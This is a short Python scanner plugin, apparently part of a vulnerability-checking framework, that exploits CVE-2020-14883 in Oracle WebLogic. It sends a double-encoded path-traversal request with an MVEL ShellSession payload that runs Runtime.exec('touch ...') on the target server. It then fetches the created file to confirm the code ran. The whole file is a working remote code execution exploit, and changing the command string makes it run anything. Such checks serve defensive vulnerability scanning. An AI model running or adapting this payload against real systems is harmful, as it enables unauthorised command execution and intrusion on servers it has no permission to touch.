#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-14883
# updated 2020/11/27
# by 0xn0ne
import requests

from stars import universe, Star, target_type
from utils import http


@universe.groups()
class CVE_2020_14883(Star):
    info = {
        'NAME': 'webLogic rce',
        'CVE': 'CVE-2020-14883',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        # sess = requests.session()
        # http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(dip, dport), headers=headers,
        #      ssl=force_ssl, session=sess)
        url = 'http://{}:{}/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)'
        http(url.format(dip, dport), ssl=force_ssl)
        r, data = http('http://{}:{}/console/framework/skins/wlsconsole/css/test.txt'.format(dip, dport),
                       ssl=force_ssl)
        if r and r.status_code == 200:
            return True, {'url': r.url}
        return False, {}
